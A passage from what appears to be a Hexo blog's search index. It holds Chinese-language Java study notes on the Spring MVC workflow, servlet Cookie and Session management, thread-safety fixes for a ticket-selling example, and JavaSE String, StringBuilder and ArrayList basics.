</p><p><strong>再来说一下Spring MVC的工作流程：</strong></p><p>图示如下：<br><img src="https://img-blog.csdnimg.cn/20200930184844281.png" alt="在这里插入图片描述"></p><ol><li>DispatcherServlet所拦截：用户通过浏览器向服务器发送请求，请求会被Spring MVC的前端控制器。</li><li>DispatcherServlet拦截到请求后，会调用HandlerMapping处理器映射器。</li><li> 处理器映射器根据请求URL找到其体的处理器，生成处理器对象及处理器拦截器（如果有则生成）一并返回给DispatcherServlet</li><li>DispatcherServlet会通过返回信思选择合适的HandlerAdapter(处理器适配器）。</li><li>HandlerAdapter会调用并执行Handler(处理器），这里的处理器指的就是程序中编写的Controller类，也被称之为后端控制器。</li><li>Controller执行完成后，会返回一个ModelAndView对象，该对象中会包含视图名或包含模型和视图名。</li><li> HandlerAdapter将ModelAndView对象返回给DispatcherServlet</li><li> DispatcherServlet会根据ModelAndView对象选择一个合适的ViewReslover（视图解析器）。</li><li> ViewReslover解析后，会向DispatcherServlet中返回具体的View(视图）。</li><li>DispatcherServlet对View进行渲染（即将模型数据填充至视图中）。</li><li>视图渲染结果会返回给客户端浏览器显示。</li></ol>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> JavaEE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SpringMVC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cookie与Session对象</title>
      <link href="2020/09/28/Java%20web%E2%80%94Cookie%E4%B8%8ESession%E5%AF%B9%E8%B1%A1/"/>
      <url>2020/09/28/Java%20web%E2%80%94Cookie%E4%B8%8ESession%E5%AF%B9%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<p>接着上篇的Servlet总结，本篇文章来总结下 Cookie 和 Session<hr></p><h4 id="一、会话介绍"><a href="#一、会话介绍" class="headerlink" title="一、会话介绍"></a>一、会话介绍</h4><h5 id="1、什么是会话？"><a href="#1、什么是会话？" class="headerlink" title="1、什么是会话？"></a>1、什么是会话？</h5><p>从打开浏览器，到访问页面，到最终关闭浏览器 ，整个过程就是一次会话  </p><h5 id="2、会话的特性"><a href="#2、会话的特性" class="headerlink" title="2、会话的特性:"></a>2、会话的特性:</h5><ul><li>一个会话中可能包含多个请求</li><li>一次完整的会话只针对一个用户</li></ul><h5 id="3、会话管理技术："><a href="#3、会话管理技术：" class="headerlink" title="3、会话管理技术："></a>3、会话管理技术：</h5><ul><li>Cookie 技术：客户端技术 </li><li>Session技术：服务器技术  </li></ul><h4 id="二、Cookie-技术：客户端技术"><a href="#二、Cookie-技术：客户端技术" class="headerlink" title="二、Cookie 技术：客户端技术"></a>二、Cookie 技术：客户端技术</h4><p><strong>1、什么是Cookie</strong>？</p><ul><li>Cookie是HTTP协议的规范之一，它是服务器和客户端之间传输的小数据。</li><li>Cookie就是服务器保存在客户端的数据！（类似于会员卡，保存在用户手中（客户端））</li><li>Cookie是一个键值对！</li></ul><p><strong>2、Cookie的常用用途</strong>：</p><ul><li>站点跟踪特定访问者访问的次数，最后访问的时间以及访问者进入站点的路径；</li><li>帮助站点统计用户个人资料以实现各种各样的个性化服务。</li><li>实现自动登录功能</li></ul><p><strong>3、Cookie的执行原理</strong>：</p><ul><li>第一次访问服务器，服务器会增加Set-Cookie头字段，将Cookie信息发送给浏览器，并保存在客户端。</li><li>当后续访问服务器时，会在请求消息中将用户信息以Cookie的形式发送给服务器，从而使服务器端分辨出当前请求是由哪个用户发出的。</li></ul><p><strong>类 javax.servlet.http.Cookie 表示cookie</strong></p><p>获取Cookie信息的方法: </p><pre><code class="java">getName()名称, getValue()值, getPath()cookie所在的目录, getDomain()有效域 getMaxAge()有效时间, getSecure()只能使用安全的协议</code></pre><p>设置Cookie信息的方法: </p><pre><code class="java">setValue(), setPath(), setDomain(), setMaxAge()设置在客户端硬盘上保存的最大时间，单位为秒</code></pre><p>从请求中获取Cookie:</p><pre><code class="java"> Cookie[] HttpServletRequest.getCookies( ) </code></pre><p>向响应中添加cookie:</p><pre><code class="java">HttpServletResponse.addCookie(&quot;name&quot;,&quot;value&quot;)</code></pre><p><strong>4、向客户端写入Cookie</strong>：</p><p>1、创建Cookie</p><pre><code class="java">Cookie c=new Cookie(&quot;name&quot;, &quot;value&quot;);</code></pre><p>2、设置Cookie的属性</p><pre><code class="java">c.setMaxAge(60*60*24); c.setDomain(&quot;pdsu.edu.cn&quot;)c.setPath(&quot;/&quot;)</code></pre><p>3、调用 response 的 addCookie 方法将其写入到客户端</p><pre><code class="java">response.addCookie(c)</code></pre><p><strong>5、读取Cookie的步骤</strong>：</p><p>从客户端读取所有能够被本服务器读取的Cookie:</p><pre><code class="java">Cookie[] cookies=request.getCookies();</code></pre><p>从中找出需要的Cookie:</p><pre><code class="java">for(int i=0;i&lt;cookies.length;i++) &#123;if( cookies[i].getName().equals(“wanted”) )&#123;      ......   &#125;&#125;</code></pre><p><strong>例</strong>：使用Cookie对象实现欢迎信息，当用户第一次访问应用时显示欢迎信息，并提示第1次访问，依次类推。</p><p>代码如下：</p><pre><code class="java">package cn.servlet;import java.io.IOException;import javax.servlet.ServletException;import javax.servlet.http.Cookie;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;public class IndexServlet extends HttpServlet &#123;    private static final long serialVersionUID = 1L;    protected void doGet(HttpServletRequest request, HttpServletResponse response)            throws ServletException, IOException &#123;        response.setContentType(&quot;text/html;charset=utf-8&quot;);        Cookie[] cookies = request.getCookies();        Integer integer = 0;        if (cookies != null) &#123;            for (int i = 0; i &lt; cookies.length; i++) &#123;                if (&quot;A&quot;.equals(cookies[i].getName())) &#123;                    integer = Integer.parseInt(cookies[i].getValue());                &#125;            &#125;        &#125;        integer++;        Cookie cookie = new Cookie(&quot;A&quot;, integer + &quot;&quot;);        if (integer &lt;= 1) &#123;            response.getWriter().append(&quot;欢迎A&quot;).append(&quot;首次访问本网站&quot;);        &#125; else &#123;            response.getWriter().append(&quot;欢迎A第&quot;).append(integer + &quot;&quot;).append(&quot;次访问本网站&quot;);        &#125;        cookie.setMaxAge(10);        response.addCookie(cookie);    &#125;    protected void doPost(HttpServletRequest request, HttpServletResponse response)            throws ServletException, IOException &#123;        doGet(request, response);    &#125;&#125;</code></pre><h4 id="三、Session技术：服务器技术"><a href="#三、Session技术：服务器技术" class="headerlink" title="三、Session技术：服务器技术"></a>三、Session技术：服务器技术</h4><p><strong>1、什么是Session技术</strong>？</p><ul><li>一种会话管理技术，将会话中的数据保存到服务器端。</li><li>是基于会话级别的cookie实现的。</li><li>通俗的讲session技术就好比医院发放给病人的就医卡和医院为每个病人保留病例档案的过程，病人去医院看病，只需要出示就医卡，医生根据卡号可以查到病人的就诊信息。</li><li>当浏览器访问服务器时，Servlet容器就会创建一个Session对象和ID属性，其中，Session对象就相当于病历档案，ID就相当于就医卡号，在后续访问时，只要将标识号传递给服务器，就能判断出是哪个客户端发送的，从而选择与之对应的Session对象为其服务， 通常情况下Session是借助Cookie技术来传递ID属性的。</li></ul><p><strong>2、Session实现原理</strong>：</p><p>图解：<br><img src="https://img-blog.csdnimg.cn/20200420222056115.png" alt="在这里插入图片描述"></p><hr/><ul><li><p>session中的数据可以被一个用户在一次会话中共享。</p></li><li><p>每个人的session是不同的。<br><img src="https://img-blog.csdnimg.cn/20200420222218865.png" alt="在这里插入图片描述"></p><hr></li><li><p>session_id的检索和创建：<br><img src="https://img-blog.csdnimg.cn/20200420222453205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ul><p><strong>3、Session会话</strong>：</p><p>1、什么是会话跟踪技术？</p><ul><li>HTTP是无状态协议，也就是没有记忆力的协议，每个请求之间无法共享数据。这就无法知道会话什么时候开始，什么时候结束，也无法确定发出请求的用户身份。这说明需要使用额外的手段来跟踪会话！</li><li>在一个会话中共享数据即会话跟踪技术</li></ul><p>2、会话追踪过程可划分为：<br><img src="https://img-blog.csdnimg.cn/20200420223630839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3、常用的会话追踪机制有：</p><ol><li><p>Cookies<br>特点：最常用<br>原理：引擎把用户会话ID保存在cookie中，保存到客户端，在以后的请求中把这个cookie发送给服务器</p></li><li><p>URL重写<br>特点：性能最低<br>使用情况：客户端不能接受cookie时<br>原理：把session id写入URL中，这样的URL会被引擎解析和某个session相关联<br>例子：<code>http://www.myser.com/catalog/index.htm;jsessionid=1234 </code></p></li></ol><ol start="3"><li>表单隐藏<br>原理：利用HTML内hidden的属性，把客户端的信息，在用户不察觉的情形下，偷偷地随着请求一起传送给到服务器处理<br>使用：<br><code>  &lt;input type=&quot;hidden&quot; name=&quot;userID&quot; value=&quot;15&quot;&gt;</code><br>优点：session数据传送到服务器端时，不会将session数据暴露在URL之上<br>缺点：用户直接观看HTML的源文件，session数据将会暴露无疑</li></ol><p>4、会话追踪机制比较：</p><p><img src="https://img-blog.csdnimg.cn/20200420224122383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>5、会话管理机制：</p><ol><li>创建会话：</li></ol><ul><li><code>HttpServletRequest</code>的<code>getSession( )</code>方法，若有会话则返回当前会话，没有则创建新会话</li><li><code>getSession(true)</code> 和上面执行同样的功能。</li><li><code>getSession(false)</code>访问一个现有的会话、而不是新创建一个会话，如果没有合法的会话则返回null</li></ul><p>例：</p><pre><code class="java">  HttpSession session=request.getSession(true)</code></pre><ol start="2"><li>存储和访问会话属性：</li></ol><ul><li>标准会话属性包括：会话标识符、数据、创建时间、上次访问时间等，都以<code>“名-值”对</code>形式保存</li><li>HttpSession提供了一种把对象存储到内存、在同一用户的后继请求中提取这些对象的标准办法</li><li>在会话中保存数据的方法：<code>setAttribute(String s, Object o)</code></li><li>从会话提取原来所保存对象的方法: <code>getAttribute(String  s)</code></li></ul><ol start="3"><li>关闭会话：</li></ol><p>1.显式关闭：<code>HttpSession.invalidate( )</code> </p><p>2.隐式关闭—会话超时(等待超时自动操作)</p><ul><li>默认的超时时间间隔是1800秒</li><li>无效之前，可以使用setInactiveInterval(int seconds)方法在客户请求之间控制这个时间间隔。</li><li>设置负值可以确保会话永远不会超时</li></ul><p><strong>4、Session常用方法</strong>：</p><pre><code class="java">getAttribute()从session中获取以前存储的值setAttribute()将键与值关联起来，存储进sessionremoveAttribute()删除session中存储的对应键的值invalidate()删除整个session及其存储的键值logout()注销当前用户getId()获取每个session对应的唯一IDgetCreationTime()获取session创建的时间getLastAccessedTime()获取session最后被访问的时间getMaxInactiveInterval()在用户没有访问的情况下，会话在被自动废弃之前应该保持多长时间getAttributeNames()返回session中所有属性的名称</code></pre><p><strong>5、Session监听器：</strong></p><p>作用：监听对象的动作（创建、销毁等）和状态</p><ul><li>创建的新的session对象</li><li>销毁session对象</li></ul><p>要实现session监听器, 需要实现 <code>javax.servlet.http.HttpSessionListener</code> 接口</p>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> JavaWeb </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javaweb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaSE——多线程学习</title>
      <link href="2020/09/28/Java%20SE%E2%80%94%E2%80%94%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AD%A6%E4%B9%A0/"/>
      <url>2020/09/28/Java%20SE%E2%80%94%E2%80%94%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h5 id="1、先来说下多线程的概念："><a href="#1、先来说下多线程的概念：" class="headerlink" title="1、先来说下多线程的概念："></a>1、先来说下多线程的概念：</h5><ul><li><p>多线程：一个进程如果有多条执行路径，则称为多线程程序。</p><p>简单来说就是原来是一条路径执行（只有一个CPU的情况下），现在是多条路径执行。就相当于一条公路，原来是一条路，为提高使用效率，充分使用这条道路，在路中间加了一些线，变成了多车道(仍是单向的)。</p></li></ul><p><img src="https://img-blog.csdnimg.cn/20200929204106500.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h5 id="2、多线程的优点："><a href="#2、多线程的优点：" class="headerlink" title="2、多线程的优点："></a>2、多线程的优点：</h5><ol><li>资源利用率更高</li><li>程序设计在某些情况下更简单</li><li>程序响应更快</li></ol><p>1、关于资源利用率更高：</p><ul><li>假如一个应用程序需要从磁盘中读取和处理文件。从磁盘读取一个文件需要5秒，处理一个文件需要2秒。那么处理这样的两个文件则需要</li></ul><pre><code class="java">5秒读取文件A2秒处理文件A5秒读取文件B2秒处理文件B---------------------总共需要14秒</code></pre><ul><li>从磁盘中读取文件的时候，大部分的CPU时间用于等待磁盘去读取数据。在这段时间里CPU处于空闲状态。它可以做一些别的事情。通过改变操作的顺序，就能够更好的使用CPU资源。看下面的顺序：</li></ul><pre><code class="java">5秒读取文件A5秒读取文件B + 2秒处理文件A2秒处理文件B---------------------总共需要12秒</code></pre><ul><li>CPU等待第一个文件被读取完。然后开始读取第二个文件。当第二文件在被读取的时候（IO读取，CPU处于空闲），CPU会去处理第一个文件。在等待磁盘读取文件的时候，CPU大部分时间是空闲的。</li></ul><p>总的说来，CPU能够在等待IO的时候做一些其他的事情。这个不一定就是磁盘IO。它也可以是网络的IO，或者用户输入。通常情况下，网络和磁盘的IO比内存的IO慢的多。</p><p>2、程序设计更简单：</p><ul><li>在单线程应用程序中，如果你想编写程序手动处理上面所提到的读取和处理的顺序，你必须记录每个文件读取和处理的状态。</li><li>相反，你可以启动两个线程，每个线程分别运行一个文件的读取和处理。线程会在等待磁盘读取文件的过程中被阻塞。在等待的时候，其他的线程能够使用CPU去处理已经读取完的文件。</li><li>其结果就是，磁盘总是在繁忙地读取不同的文件到内存中。这会带来磁盘和CPU利用率的提升。而且每个线程只需要记录一个文件，因此这种方式也很容易编程实现。</li></ul><p>3、 程序响应更快：</p><ul><li>如果一个请求需要占用大量的时间来处理，在这段时间内客户端就无法发送新的请求给服务端。只有服务器在监听的时候，请求才能被接收。</li><li>另一种设计是，监听线程把请求传递给工作者线程(worker thread)，然后立刻返回去监听。而工作者线程则能够处理这个请求并发送一个回复给客户端。</li><li>这样就大大提高了程序的响应速度。</li></ul><p>以下是一个多线程实现买票的例子：<hr></p><p><strong>1、案例需求</strong>：</p><ul><li>某电影院目前正在上映国产大片，共有100张票，而它有3个窗口卖票，请设计一个程序模拟该电影院卖票。</li></ul><p>实现步骤：</p><ol><li>定义一个类SellTicket实现Runnable接口，里面定义一个成员变量：private int tickets = 100;</li><li>在SellTicket类中重写run()方法实现卖票，代码步骤如下</li><li>判断票数大于0，就卖票，并告知是哪个窗口卖的</li><li>卖了票之后，总票数要减1</li><li>票没有了，也可能有人来问，所以这里用死循环让卖票的动作一直执行</li><li>定义一个测试类SellTicketDemo，里面有main方法，代码步骤如下</li><li>创建SellTicket类的对象</li><li>创建三个Thread类的对象，把SellTicket对象作为构造方法的参数，并给出对应的窗口名称</li><li>启动线程</li></ol><p>代码实现：</p><pre><code class="java">public class SellTicket implements Runnable &#123;    private int tickets = 100;    //在SellTicket类中重写run()方法实现卖票，代码步骤如下    @Override    public void run() &#123;    while (true) &#123;        if (tickets &gt; 0) &#123;            System.out.println(Thread.currentThread().getName() + &quot;正在出售第&quot; +tickets + &quot;张票&quot;);            tickets--;            &#125;        &#125;    &#125;&#125;</code></pre><pre><code class="java">public class SellTicketDemo &#123;    public static void main(String[] args) &#123;        //创建SellTicket类的对象        SellTicket st = new SellTicket();        //创建三个Thread类的对象，把SellTicket对象作为构造方法的参数，并给出对应的窗口名称        Thread t1 = new Thread(st,&quot;窗口1&quot;);        Thread t2 = new Thread(st,&quot;窗口2&quot;);        Thread t3 = new Thread(st,&quot;窗口3&quot;);        //启动线程        t1.start();        t2.start();        t3.start();    &#125;&#125;</code></pre><p>执行结果：<br><img src="https://img-blog.csdnimg.cn/2020092821013040.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>可以看到票数出现了异常，出现了重复的票，甚至还有可能出现负数的票。</p><p><strong>2、卖票案例的问题</strong>：</p><p>问题产生原因：</p><ul><li>线程执行的随机性导致的</li></ul><p>详细解析：</p><p>相同的票出现了多次:</p><pre><code class="java">public class SellTicket implements Runnable &#123;    private int tickets = 100;    @Override    public void run() &#123;         while (true) &#123;             //tickets = 100;             //t1,t2,t3             //假设t1线程抢到CPU的执行权             if (tickets &gt; 0) &#123;                 //通过sleep()方法来模拟出票时间                 try &#123;                     Thread.sleep(100);                     //t1线程休息100毫秒                     //t2线程抢到了CPU的执行权，t2线程就开始执行，执行到这里的时候，t2线程休息100毫秒                     //t3线程抢到了CPU的执行权，t3线程就开始执行，执行到这里的时候，t3线程休息100毫秒                 &#125; catch (InterruptedException e) &#123;                     e.printStackTrace();                 &#125;                //假设线程按照顺序醒过来                 //t1抢到CPU的执行权，在控制台输出：窗口1正在出售第100张票                 System.out.println(Thread.currentThread().getName() + &quot;正在出售第&quot;+tickets + &quot;张票&quot;);                 //t2抢到CPU的执行权，在控制台输出：窗口2正在出售第100张票                 //t3抢到CPU的执行权，在控制台输出：窗口3正在出售第100张票                 tickets--;                 //如果这三个线程还是按照顺序来，这里就执行了3次--的操作，最终票就变成了97             &#125;         &#125;    &#125;&#125;</code></pre><p>出现了负数的票：</p><pre><code class="java">public class SellTicket implements Runnable &#123;    private int tickets = 100;    public void run() &#123;        while (true) &#123;        //tickets = 1;        //t1,t2,t3        //假设t1线程抢到CPU的执行权        if (tickets &gt; 0) &#123;            //通过sleep()方法来模拟出票时间            try &#123;                Thread.sleep(100);                //t1线程休息100毫秒                //t2线程抢到了CPU的执行权，t2线程就开始执行，执行到这里的时候，t2线程休息100毫秒                //t3线程抢到了CPU的执行权，t3线程就开始执行，执行到这里的时候，t3线程休息100毫秒                &#125; catch (InterruptedException e) &#123;                    e.printStackTrace();                &#125;                //假设线程按照顺序醒过来                //t1抢到了CPU的执行权，在控制台输出：窗口1正在出售第1张票                //假设t1继续拥有CPU的执行权，就会执行tickets--;操作，tickets = 0;                //t2抢到了CPU的执行权，在控制台输出：窗口1正在出售第0张票                //假设t2继续拥有CPU的执行权，就会执行tickets--;操作，tickets = -1;                //t3抢到了CPU的执行权，在控制台输出：窗口3正在出售第-1张票                //假设t2继续拥有CPU的执行权，就会执行tickets--;操作，tickets = -2;                System.out.println(Thread.currentThread().getName() + &quot;正在出售第&quot; +tickets + &quot;张票&quot;);                tickets--;            &#125;        &#125;    &#125;&#125;</code></pre><p><strong>3、同步代码块解决数据安全问题</strong>：</p><p>安全问题出现的条件：</p><ol><li>是多线程环境</li><li>有共享数据</li><li>有多条语句操作共享数据</li></ol><p>如何解决多线程安全问题呢?</p><ul><li>基本思想：让程序没有安全问题的环境</li></ul><p>如何实现?</p><ul><li>把多条语句操作共享数据的代码给锁起来，让任意时刻只能有一个线程执行即可。</li></ul><p>Java提供了同步代码块的方式来解决：</p><p>同步代码块格式：</p><pre><code class="java">synchronized(任意对象) &#123;    多条语句操作共享数据的代码&#125;</code></pre><p>synchronized(任意对象)：就相当于给代码加锁了，任意对象就可以看成是一把锁。</p><p>同步的好处和弊端：</p><ul><li>好处：解决了多线程的数据安全问题</li><li>弊端：当线程很多时，因为每个线程都会去判断同步上的锁，这是很耗费资源的，无形中会降低程序的运行效率。</li></ul><p>代码演示：</p><pre><code class="java">package sellticket;public class SellTicket implements Runnable &#123;    private int tickets = 100;    private Object obj = new Object();//使用同一个对象加锁，相当于使用同一把锁    @Override    public void run() &#123;        while (true) &#123;            //tickets = 100;            //t1,t2,t3            //假设t1抢到了CPU的执行权            //假设t2抢到了CPU的执行权            synchronized (obj) &#123;               //t1进来后，就会把这段代码给锁起来                if (tickets &gt; 0) &#123;                    try &#123;                        Thread.sleep(100);                        //t1休息100毫秒                    &#125; catch (InterruptedException e) &#123;                        e.printStackTrace();                    &#125;                    //窗口1正在出售第100张票                    System.out.println(Thread.currentThread().getName() + &quot;正在出售第&quot; + tickets + &quot; 张票&quot;);                    tickets--; //tickets = 99;                &#125;            &#125;            //t1出来了，这段代码的锁就被释放了        &#125;    &#125;&#125;</code></pre><pre><code class="java">public class SellTicketDemo &#123;    public static void main(String[] args) &#123;        SellTicket st = new SellTicket();        Thread t1 = new Thread(st, &quot;窗口1&quot;);        Thread t2 = new Thread(st, &quot;窗口2&quot;);        Thread t3 = new Thread(st, &quot;窗口3&quot;);        t1.start();        t2.start();        t3.start();    &#125;&#125;</code></pre><p><strong>4、同步方法解决数据安全问题</strong>：</p><p>同步方法：就是把synchronized关键字加到方法上。</p><pre><code class="java">修饰符 synchronized 返回值类型 方法名(方法参数) &#123;    方法体；&#125;</code></pre><p>同步方法的锁对象是：<strong>this</strong></p><p>静态同步方法：</p><ul><li>同步静态方法：就是把synchronized关键字加到静态方法上</li></ul><p>例：</p><p> 同步方法:</p><pre><code class="java"> private synchronized void sellTicket() &#123;    if (tickets &gt; 0) &#123;         try &#123;             Thread.sleep(100);         &#125; catch (InterruptedException e) &#123;             e.printStackTrace();         &#125;         System.out.println(Thread.currentThread().getName() + &quot;正在出售第&quot; + tickets + &quot;张票&quot;);         tickets--;     &#125; &#125;</code></pre><p>静态同步方法:</p><pre><code class="java">private static synchronized void sellTicket() &#123;    if (tickets &gt; 0) &#123;        try &#123;            Thread.sleep(100);            &#125; catch (InterruptedException e) &#123;                e.printStackTrace();            &#125;            System.out.println(Thread.currentThread().getName() + &quot;正在出售第&quot; +tickets + &quot;张票&quot;);            tickets--;        &#125;    &#125;&#125;</code></pre><p><strong>5、Lock锁</strong>：</p><p>虽然我们可以理解同步代码块和同步方法的锁对象问题，但是我们并没有直接看到在哪里加上了锁，在哪里释放了锁，为了更清晰的表达如何加锁和释放锁，JDK5以后提供了一个新的锁对象Lock</p><ul><li>Lock是接口不能直接实例化，采用它的实现类ReentrantLock来实例化。</li></ul><p>ReentrantLock构造方法：</p><p><img src="https://img-blog.csdnimg.cn/20200929194444712.png#pic_center" alt="在这里插入图片描述"><br>加锁解锁方法：</p><p><img src="https://img-blog.csdnimg.cn/20200929194507222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>例：</p><pre><code class="java">public class SellTicket implements Runnable &#123;    private int tickets = 100;    private Lock lock = new ReentrantLock();    @Override    public void run() &#123;        while (true) &#123;            try &#123;                lock.lock();                if (tickets &gt; 0) &#123;                    try &#123;                        Thread.sleep(100);                    &#125; catch (InterruptedException e) &#123;                        e.printStackTrace();                    &#125;                    System.out.println(Thread.currentThread().getName() + &quot;正在出售第&quot; + tickets + &quot; 张票&quot;);                    tickets--;                &#125;            &#125; finally &#123;                lock.unlock();            &#125;        &#125;    &#125;&#125;</code></pre><p>关于java多线程的总结暂时就这些了。</p><p>参考文章：<a href="https://www.jb51.net/article/127443.htm">https://www.jb51.net/article/127443.htm</a><hr></p>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> JavaSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javase </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaSE 重点知识笔记</title>
      <link href="2020/09/28/Java%20SE%20%E9%87%8D%E7%82%B9%E7%9F%A5%E8%AF%86%E7%AC%94%E8%AE%B0/"/>
      <url>2020/09/28/Java%20SE%20%E9%87%8D%E7%82%B9%E7%9F%A5%E8%AF%86%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><p>前言：<br>学了半年的Java web发现还有一些JavaSE的知识没有掌握，趁着这个暑假把java的基础知识补一下。<hr></p><h4 id="1、String对象的特点"><a href="#1、String对象的特点" class="headerlink" title="1、String对象的特点"></a>1、String对象的特点</h4><p><strong>1、创建字符串对象两种方式的区别</strong>：</p><ul><li>通过构造方法创建</li></ul><p>通过 new 创建的字符串对象，每一次 new 都会申请一个内存空间，虽然内容相同，但是地址值不同。<br><img src="https://img-blog.csdnimg.cn/20200725232701179.png"><br>上面的代码中，JVM会首先创建一个字符数组, 然后每一次new的时候都会有一 个新的地址， 只不过s1和s2参考的字符串内容是相同的。</p><ul><li>直接赋值方式创建</li></ul><p>以<code>&quot;&quot;</code>方式给出的字符串，只要字符序列相同(顺序和大小写)，无论在程序代码中出现几次，JVM 都只会建立一个 String 对象，并在字符串池中维护。<br><img src="https://img-blog.csdnimg.cn/20200725234256229.png"><br>在上面的代码中，针对第一行代码， JVM会建立一个 String对象放在字符串池中，并给s3参考，第二行则让s4直接参考字符串池中的String对象,也就是说它们本质上是同一个对象。</p><p><strong>2、字符串的比较</strong>：</p><p>1、<code>==</code>号的作用 ：</p><ul><li>比较基本数据类型:比较的是具体的值</li><li>比较引用数据类型:比较的是对象地址值</li></ul><p>2、<code>equals</code>方法的作用：</p><p>因为String是类，属于引用类型，所以用<code>equals</code>来进行比较。</p><pre><code class="java">public boolean equals(String s)   比较两个字符串内容是否相同、区分大小写</code></pre><p><img src="https://img-blog.csdnimg.cn/20200819215804840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><hr></p><h4 id="2、StringBuilder对象"><a href="#2、StringBuilder对象" class="headerlink" title="2、StringBuilder对象"></a>2、StringBuilder对象</h4><p><strong>1、StringBuilder概述</strong>：</p><ul><li>StringBuilder是一个可变的字符串类,我们可以把它看成是一个容器，这里的可变指的是StringBuilder对象中的内容是可变的。</li></ul><p>String和StringBuilder的区别:</p><ul><li>String: 内容是不可变的</li><li>StringBuilder: 内容是可变的</li></ul><p><strong>2、StringBuilder类的构造方法</strong>：</p><p>常用的构造方法：<br><img src="https://img-blog.csdnimg.cn/20200730221223824.png"></p><p>示例代码：</p><pre><code class="java">public class StringTest2 &#123;    public static void main(String[] args) &#123;        // public StringBuilder() :创建一个空白可变字符串对象,不含有任何内容        StringBuilder sb = new StringBuilder();        System.out.println(&quot;sb:&quot; + sb);        System.out.println(&quot;sb. length():&quot; + sb.length());        // public Stri ngBuilder(String str) :根据字符串的内容，来创建可变字符串对象        StringBuilder sb2 = new StringBuilder(&quot;he11o&quot;);        System.out.println(&quot;sb2:&quot; + sb2);        System.out.println(&quot;sb2. length():&quot; + sb2.length());    &#125;&#125;</code></pre><p><strong>3、StringBuilder类添加和反转方法</strong>：</p><p> 添加和反转方法：<br><img src="https://img-blog.csdnimg.cn/20200730223038613.png"><br> 示例代码：<br><img src="https://img-blog.csdnimg.cn/20200730223855933.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p><p><strong>4、StringBuilder和String相互转换</strong>：</p><p>StringBuilder转换为String：</p><ul><li><p><code>public String toString()</code>：通过<code>toString()</code>就可以实现把StringBuilder转换为String</p><p>String转换为StringBuilder：</p></li><li><p><code>public StringBuilder(String s)</code> ：通过构造方法就可以实现把String转换为StringBuilder</p><hr></li></ul><h4 id="3、ArrayList"><a href="#3、ArrayList" class="headerlink" title="3、ArrayList"></a>3、ArrayList</h4><p><strong>1、ArrayList类概述</strong>：</p><p> 什么是集合：</p><ul><li><p>提供一种存储空间可变的存储模型，存储的数据容量可以发生改变。</p><p>ArrayList集合的特点：</p></li><li><p>底层是数组实现的，长度可以变化。    </p></li></ul><p>泛型的使用：</p><ul><li>用于约束集合中存储元素的数据类型。</li></ul><p><strong>2、ArrayList类常用方法</strong>：</p><p>构造方法：<br>| 方法名 | 说明 |<br>|–|–|<br>| public ArrayList() | 创建一个空的集合对象 |<br>成员方法：<br><img src="https://img-blog.csdnimg.cn/20200731204753744.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p><pre><code class="java">public class ArrayListDemo02 &#123;    public static void main(String[] args) &#123;        // 创建集合        ArrayList&lt;String&gt; array = new ArrayList&lt;String&gt;();        // 添加元素        array.add(&quot;hello&quot;);        array.add(&quot;world&quot;);        array.add(&quot;java&quot;);        // public boolean remove(Object o)：删除指定的元素，返回删除是否成功        System.out.println(array.remove(&quot;world&quot;));        System.out.println(array.remove(&quot;javaee&quot;));        // public E remove(int index)：删除指定索引处的元素，返回被删除的元素        System.out.println(array.remove(1));        // IndexOutOfBoundsException        System.out.println(array.remove(3));        // public E set(int index,E element)：修改指定索引处的元素，返回被修改的元素        System.out.println(array.set(1, &quot;javaee&quot;));        // IndexOutOfBoundsException        System.out.println(array.set(3, &quot;javaee&quot;));        // public E get(int 